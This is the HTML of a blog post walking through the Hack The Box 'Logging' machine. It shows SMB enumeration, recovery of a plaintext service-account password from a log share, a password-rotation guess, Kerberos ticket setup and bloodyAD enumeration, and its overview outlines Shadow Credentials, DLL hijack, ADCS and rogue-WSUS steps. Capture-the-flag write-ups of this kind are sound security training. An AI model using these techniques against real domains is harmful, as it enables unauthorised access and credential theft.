@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/07/23/hackthebox-logging/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewLogging is a hard-difficulty Windows machine from Hack The Box that walks through a full Active Directory compromise chained around a WSUS deployment. We start with a foothold on an SMB Logs s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Logging">
+<meta property="og:url" content="http://fouedsaidi.com/2026/07/23/Hackthebox-Logging/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewLogging is a hard-difficulty Windows machine from Hack The Box that walks through a full Active Directory compromise chained around a WSUS deployment. We start with a foothold on an SMB Logs s">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Logging/Logging.png">
+<meta property="article:published_time" content="2026-07-23T16:05:31.000Z">
+<meta property="article:modified_time" content="2026-07-23T16:11:40.180Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Logging/Logging.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Logging -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Logging</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-07-23 19:05:31</span>
+        <span class="mobile">2026-07-23 19:05:31</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-07-23 19:11:40</span>
+            <span class="mobile">2026-07-23 19:11:40</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Logging is a hard-difficulty Windows machine from Hack The Box that walks through a full Active Directory compromise chained around a WSUS deployment. We start with a foothold on an SMB <code>Logs</code> share where a verbose IdentitySync trace leaks an old <code>svc_recovery</code> password; a simple yearly rotation guess (<code>2025</code> → <code>2026</code>) gets us valid Kerberos-only credentials. From there we abuse <code>svc_recovery</code>‘s <code>GenericWrite</code> over the <code>msa_health$</code> managed service account through a Shadow Credentials attack to recover its NT hash and land a WinRM session. As <code>msa_health$</code> we abuse a writable <code>UpdateMonitor</code> service that loads a DLL from a directory we control, giving us code execution as <code>jaylee.clifton</code> and the user flag. Finally we harvest jaylee’s TGT with Rubeus, extract her NT hash through ADCS, abuse the ESC17-vulnerable <code>UpdateSrv</code> template together with a DNS hijack to spoof <code>wsus.logging.htb</code>, and stand up a rogue WSUS server (<code>wsuks</code>) that pushes a Microsoft-signed <code>PsExec64.exe</code> as a SYSTEM update, adding <code>msa_health$</code> to Domain Admins and handing us the root flag.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Logging/Logging.png"
+                      alt="Logging-info-card"
+                ><figcaption>Logging-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>Before touching the box we add the target to <code>/etc/hosts</code> and sync our clock with the domain controller. This is not optional here, Kerberos will refuse to play along if the clock skew is too large:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.129.36.116 logging.htb dc01.logging.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">sudo ntpdate 10.129.36.116</span><br></pre></td></tr></table></figure></div>
+
+<p>With that out of the way we run a full TCP port scan to see what services are exposed:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- --min-rate 5000 10.129.36.116</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP</span><br><span class="line">3269/tcp  open  ssl/ldap</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">8530/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">8531/tcp  open  ssl/http      Microsoft IIS httpd 10.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49664-49743/tcp  open  msrpc  Microsoft Windows RPC</span><br><span class="line"></span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: 3:1:1: Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h00m00s</span><br></pre></td></tr></table></figure></div>
+
+<p>The scan tells us a lot. We’re dealing with an Active Directory domain controller (<code>DC01.logging.htb</code>), WSUS is exposed on ports <code>8530</code>&#x2F;<code>8531</code>, WinRM is available on <code>5985</code>, SMB signing is required, and there’s a substantial <strong>7-hour clock skew</strong> between us and the target which we’ll need to keep compensating for throughout the box.</p>
+<h2 id="Initial-Access-SMB-Enumeration"><a href="#Initial-Access-SMB-Enumeration" class="headerlink" title="Initial Access - SMB Enumeration"></a>Initial Access - SMB Enumeration</h2><p>We’re handed a set of credentials for this box, <code>wallace.everette:Welcome2026@</code>, so the first thing we do is confirm they actually work against SMB:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 10.129.36.116 -u <span class="string">&#x27;wallace.everette&#x27;</span> -p <span class="string">&#x27;Welcome2026@&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SMB  10.129.36.116  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None)</span><br><span class="line">SMB  10.129.36.116  445  DC01  [+] logging.htb\wallace.everette:Welcome2026@</span><br></pre></td></tr></table></figure></div>
+
+<p>They’re valid, so we enumerate the available shares:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.129.36.116/ -U <span class="string">&#x27;logging.htb/wallace.everette%Welcome2026@&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">C$              Disk      Default share</span><br><span class="line">IPC$            IPC       Remote IPC</span><br><span class="line">Logs            Disk</span><br><span class="line">NETLOGON        Disk      Logon server share</span><br><span class="line">SYSVOL          Disk      Logon server share</span><br><span class="line">WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.</span><br></pre></td></tr></table></figure></div>
+
+<p>The non-default <code>Logs</code> share immediately stands out, so we recursively pull everything out of it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p logs &amp;&amp; <span class="built_in">cd</span> logs</span><br><span class="line">smbclient <span class="string">&#x27;//10.129.36.116/Logs&#x27;</span> -U <span class="string">&#x27;logging.htb/wallace.everette%Welcome2026@&#x27;</span> -c <span class="string">&#x27;recurse; prompt; mget *&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getting file \Audit_Heartbeat.log of size 1294 as Audit_Heartbeat.log (0.8 KiloBytes/sec)</span><br><span class="line">getting file \IdentitySync_Trace_20260219.log of size 8488 as IdentitySync_Trace_20260219.log (4.6 KiloBytes/sec)</span><br><span class="line">getting file \Service_State.log of size 468 as Service_State.log (0.4 KiloBytes/sec)</span><br><span class="line">getting file \TaskMonitor.log of size 1170 as TaskMonitor.log (1.0 KiloBytes/sec)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Credential-Discovery-from-Logs"><a href="#Credential-Discovery-from-Logs" class="headerlink" title="Credential Discovery from Logs"></a>Credential Discovery from Logs</h2><p>Reading through the downloaded logs, <code>IdentitySync_Trace_20260219.log</code> turns out to be a verbose LDAP connection dump that carelessly logs plaintext credentials for a service account:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump:</span><br><span class="line">&#123; Domain: &quot;logging.htb&quot;, Server: &quot;DC01&quot;, SSL: &quot;False&quot;,</span><br><span class="line">  BindUser: &quot;LOGGING\svc_recovery&quot;, BindPass: &quot;Em3rg3ncyPa$$2025&quot;, Timeout: 30 &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>The catch is that the same log shows this password was already invalid by the time the trace was captured:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR -</span><br><span class="line">   Server error: 8009030C ... data 52e ... LDAP_INVALID_CREDENTIALS</span><br></pre></td></tr></table></figure></div>
+
+<p>The password <code>Em3rg3ncyPa$$2025</code> embeds a year, which is a classic sign of a rotation policy. We guess the account was rotated forward and swap <code>2025</code> for <code>2026</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb dc01.logging.htb -u <span class="string">&#x27;svc_recovery&#x27;</span> -p <span class="string">&#x27;Em3rg3ncyPa$$2026&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMB  10.129.36.116  445  DC01  [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2026 STATUS_ACCOUNT_RESTRICTION</span><br></pre></td></tr></table></figure></div>
+
+<p><code>STATUS_ACCOUNT_RESTRICTION</code> is exactly what we want to see here. It means the password is correct but the account is restricted to Kerberos-only authentication (NTLM is disabled), so we can’t authenticate over NTLM but the credential is confirmed good.</p>
+<p>Since we’re forced into Kerberos, we build a <code>krb5.conf</code> for the domain:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">&#x27;cat &gt; /etc/krb5.conf &lt;&lt; EOF</span></span><br><span class="line"><span class="string">[libdefaults]</span></span><br><span class="line"><span class="string">    default_realm = LOGGING.HTB</span></span><br><span class="line"><span class="string">    dns_lookup_realm = false</span></span><br><span class="line"><span class="string">    dns_lookup_kdc = false</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[realms]</span></span><br><span class="line"><span class="string">    LOGGING.HTB = &#123;</span></span><br><span class="line"><span class="string">        kdc = dc01.logging.htb</span></span><br><span class="line"><span class="string">        admin_server = dc01.logging.htb</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[domain_realm]</span></span><br><span class="line"><span class="string">    .logging.htb = LOGGING.HTB</span></span><br><span class="line"><span class="string">    logging.htb = LOGGING.HTB</span></span><br><span class="line"><span class="string">EOF&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Then we request a TGT for <code>svc_recovery</code>. Because the environment keeps resetting our clock, we chain <code>ntpdate</code> and <code>kinit</code> inside a single sudo session so the time is correct at the moment the ticket is requested:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">&#x27;ntpdate 10.129.36.116; echo &quot;Em3rg3ncyPa\$\$2026&quot; | kinit svc_recovery@LOGGING.HTB&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CLOCK: time stepped by 25200.579937</span><br><span class="line">Password for svc_recovery@LOGGING.HTB:</span><br></pre></td></tr></table></figure></div>
+
+<p>We copy the resulting ticket cache into our working directory and confirm it loaded:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> /tmp/krb5cc_0 svc_recovery.ccache</span><br><span class="line">sudo <span class="built_in">chown</span> kali:kali svc_recovery.ccache</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=$(<span class="built_in">pwd</span>)/svc_recovery.ccache</span><br><span class="line">klist</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ticket cache: FILE:/home/kali/logging/svc_recovery.ccache</span><br><span class="line">Default principal: svc_recovery@LOGGING.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">04/23/2026 04:51:57  04/23/2026 08:51:57  krbtgt/LOGGING.HTB@LOGGING.HTB</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-1-Shadow-Credentials-on-msa-health"><a href="#Privilege-Escalation-1-Shadow-Credentials-on-msa-health" class="headerlink" title="Privilege Escalation #1 - Shadow Credentials on msa_health$"></a>Privilege Escalation #1 - Shadow Credentials on msa_health$</h2><p>With a working ticket in hand, we ask <code>bloodyAD</code> what objects <code>svc_recovery</code> can write to. The <code>faketime</code> wrapper is there to smooth over the constant clock resets that would otherwise trigger Kerberos skew errors:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=$(<span class="built_in">pwd</span>)/svc_recovery.ccache</span><br><span class="line">faketime -f <span class="string">&#x27;+25200&#x27;</span> bloodyAD -d logging.htb --host dc01.logging.htb -k get writable --detail</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb</span><br><span class="line">...</span><br><span class="line">msDS-KeyCredentialLink: WRITE</span><br><span class="line">msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE</span><br><span class="line">servicePrincipalName: WRITE</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
